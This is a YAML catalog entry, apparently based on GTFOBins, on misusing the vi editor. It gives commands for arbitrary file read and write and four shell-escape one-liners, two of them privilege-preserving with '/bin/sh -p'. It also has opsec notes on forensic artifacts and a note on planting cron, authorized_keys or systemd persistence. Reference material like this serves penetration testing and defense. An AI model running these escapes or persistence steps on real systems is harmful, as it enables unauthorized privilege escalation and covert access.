---
name: vi
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: vi /path/to/input-file
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    vi /path/to/output-file
    iDATA
    ^[
    w
  notes: Where `^[` is the escape key.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: vi -c ':!/bin/sh' /dev/null
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: vi -c ':shell'
- id: shell-3
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: vi -c ':set shell=/bin/sh\ -p | shell'
- id: shell-4
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: vi -c ':terminal /bin/sh -p'
references:
- https://gtfobins.github.io/gtfobins/vi/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
